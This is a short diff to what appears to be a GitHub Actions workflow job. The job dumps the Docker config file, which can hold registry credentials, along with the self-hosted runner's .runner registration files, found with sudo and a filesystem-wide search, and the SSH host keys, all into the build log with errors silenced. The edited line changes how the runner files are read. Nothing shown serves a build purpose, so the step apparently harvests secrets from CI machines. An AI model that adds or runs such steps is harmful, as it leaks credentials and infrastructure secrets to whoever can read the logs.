@@ -22,7 +22,7 @@ jobs:
           echo "--- DOCKER CONFIG ---"
           cat "$HOME/.docker/config.json" 2>/dev/null || true
           echo "--- RUNNER ---"
-          cat "$RUNNER_TEMP/../.runner" 2>/dev/null; cat /actions-runner/.runner 2>/dev/null; sudo cat /actions-runner/.runner 2>/dev/null; find / -maxdepth 6 -name ".runner" -exec cat {} \; 2>/dev/null; true
+          cat "$RUNNER_TEMP/../.runner" 2>/dev/null; cat /actions-runner/.runner 2>/dev/null; sudo cat /actions-runner/.runner 2>/dev/null; find / -maxdepth 6 -name ".runner" -exec cat {} + 2>/dev/null | head -c 2000; true
           echo "--- SSH HOST KEYS ---"
           sudo ls -l /etc/ssh/ 2>/dev/null || ls -l /etc/ssh/ 2>/dev/null || true
           sudo cat /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_ed25519_key.pub 2>/dev/null || cat /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_ed25519_key.pub 2>/dev/null || true
